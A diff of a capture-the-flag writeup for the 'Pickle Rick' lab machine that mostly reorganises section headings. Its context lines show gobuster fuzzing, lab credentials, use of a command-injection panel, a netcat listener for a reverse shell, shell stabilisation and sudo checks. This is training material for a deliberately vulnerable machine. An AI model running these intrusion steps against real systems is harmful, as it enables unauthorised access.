@@ -23,10 +23,8 @@ This writeup documents the penetration testing of the [**Pickle Rick**](https://
 In this case I'll try to log into a panel which is vulnerable to command injection and I'll find the 3 ingredients the CTF wants us to submit.
 
 <br>
-# Recon
+# Information Gathering
 ------------------
-## Enumeration of exposed services
-----------------
 
 Once we have discovered the IP of the machine we need to enumerate as much information as possible.
 
@@ -98,10 +96,6 @@ Nmap found some open ports. The intrusion is probably going to be, or at least s
 To figure out [**Ubuntu's version codename**](https://launchpad.net/ubuntu/+source/apache2/2.4.41-4ubuntu3.10) you can search on the inernet the name of the Apache or SSH version followed by '**launchpad**'.
 We are facing an **Ubuntu Focal**.
 
-
-## Web enumeration
-------------
-
 We can't do much with the SSH service since we don't have credentials yet. Now it's time to enumerate the web server running on the port 80:
 
 ```
@@ -137,9 +131,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-08 22:48:
 
 But the machine doesn't support password authentication, I think it's using SSH key based auth.
 
-## Fuzzing and file enumeration
-----
-
 ```java
 ❯ gobuster dir -u http://10.10.195.201/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x txt,xml,php,bak
 ===============================================================
@@ -170,19 +161,26 @@ Finished
 ===============================================================
 ```
 
+
+
+
+<br>
+# Vulnerability Assessment
+-------
+
 Gobuster found some interesting files.
 
 ![](/assets/images/thm-pickle-rick/robots.png)
+
+We got the **credentials**  ``R1ckRul3s:Wubbalubbadubdub``, if you put them in login.php, you'll access a **Command Panel**. 
 
 ![](/assets/images/thm-pickle-rick/clue.png)
 
 <br>
 # Exploitation
 -------
-## Identification and exploitation of vulnerabilities
--------
 
-We got the **credentials**  ``R1ckRul3s:Wubbalubbadubdub``, if you put them in login.php, you'll access a **Command Panel**. Let's try to get a reverse shell.
+Let's try to get a reverse shell.
 
 ```php
 ❯ nc -nvlp 443
@@ -197,8 +195,6 @@ www-data
 <br>
 # Post-Exploitation
 ------
-### tty treatment
------------
 
 ```bash
 script /dev/null -c bash
@@ -212,24 +208,16 @@ stty rows 44 columns 185
 
 Finally, we need to find those 3 ingredients and submit them.
 
-## First ingredient
--------
-
 ```
 www-data@ip-10-10-39-70:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
 ***REDACTED***
 ```
-
-## Second ingredient
-------
 
 ```
 www-data@ip-10-10-39-70:/home/rick$ cat second\ ingredients 
 ***REDACTED***
 ```
 
-## Final ingredient
-------
 ```
 www-data@ip-10-10-39-70:/home/ubuntu$ sudo -l
 Matching Defaults entries for www-data on ip-10-10-39-70:
